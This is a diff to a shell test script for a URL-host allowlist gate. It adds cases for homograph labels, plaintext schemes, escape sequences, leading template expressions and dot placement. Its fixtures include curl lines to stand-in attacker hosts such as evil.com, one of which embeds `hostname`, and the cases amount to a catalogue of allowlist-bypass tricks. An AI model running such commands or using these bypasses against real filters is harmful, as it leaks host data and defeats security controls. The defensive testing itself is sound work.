@@ -218,8 +218,14 @@ check "non-ASCII host is reported, not silently unmatched" block "$sample_dir/y3
 check "homograph label cannot satisfy the snapshot pattern" block "$sample_dir/y4.rs" \
   'const U: &str = "https://solana-snapshot-\xd0\xb0ms.erpc.global/x";'
 
-check "a backtick host has no literal to check" allow "$sample_dir/y5.sh" \
+# This case used to assert `allow`, on the reasoning that an expression at
+# the start of a host leaves nothing to check. It leaves the registrable
+# domain, which is the part that decides where the request goes.
+check "an expression at the start still has its domain checked" block "$sample_dir/y5.sh" \
   'curl https://\x60hostname\x60.evil.com/x'
+
+check "a host that is only a backtick expression is skipped" allow "$sample_dir/y5b.sh" \
+  'curl https://\x60hostname\x60/x'
 
 check "a backtick after a literal prefix is still checked" block "$sample_dir/y6.sh" \
   'curl https://evil.example.com\x60x\x60/y'
@@ -323,6 +329,46 @@ check "declared host pattern with a template label" allow "$sample_dir/t7.ts" \
 
 check "template in the path of a declared host" allow "$sample_dir/t8.sh" \
   'curl "https://user-api.erpc.global/v1/${id}"'
+
+# The seam. An earlier arrangement answered the allowlist question first and
+# returned, so a host matching the declared pattern carried a plaintext
+# scheme, a Cyrillic label or an escape past checks this gate states as
+# absolute. Each of these four passed, and each is a different check.
+check "plaintext http survives a pattern template" block "$sample_dir/s1.ts" \
+  'const u = `http://solana-snapshot-${region}.erpc.global/x`;'
+
+check "plaintext ws survives a pattern template" block "$sample_dir/s2.ts" \
+  'const u = `ws://solana-snapshot-${region}.erpc.global/x`;'
+
+check "homograph label beside a pattern template" block "$sample_dir/s3.ts" \
+  'const u = `https://solana-snapshot-\xd0\xb0${r}.erpc.global/x`;'
+
+check "escape sequence beside a pattern template" block "$sample_dir/s4.ts" \
+  'const u = `https://solana-snapshot-\x5cx2e${r}.erpc.global/x`;'
+
+# An expression at the START of the host. What follows it is the registrable
+# domain, so "there is no literal to check" is only true when nothing
+# literal follows at all.
+check "expression first, attacker domain after (dollar-brace)" block "$sample_dir/e1.ts" \
+  'const u = `https://${A}.evil.example.net/x`;'
+
+check "expression first, attacker domain after (handlebars)" block "$sample_dir/e2.yml" \
+  '      - run: curl https://{{ host }}.evil.example.net/x'
+
+check "expression first, attacker domain after (command substitution)" block "$sample_dir/e3.sh" \
+  'curl "https://$(h).evil.example.net/x"'
+
+check "the same host through userinfo answers the same way" block "$sample_dir/e4.sh" \
+  'curl "https://u@${A}.evil.example.net/x"'
+
+# The dot rule, in both directions. Without it a declared pattern would
+# vouch for a different registrable domain. The existing t6 case fails the
+# ends-with test before the dot rule is reached, so it does not pin this.
+check "a dot in the tail moves the domain" block "$sample_dir/dot1.ts" \
+  'const u = `https://solana-snapshot-${r}.evil.erpc.global/x`;'
+
+check "a dot in the head moves the domain" block "$sample_dir/dot2.ts" \
+  'const u = `https://solana-snapshot-x.y${r}.erpc.global/x`;'
 
 printf '\n%s passed, %s failed\n' "$pass" "$fail"
 [ "$fail" -eq 0 ]
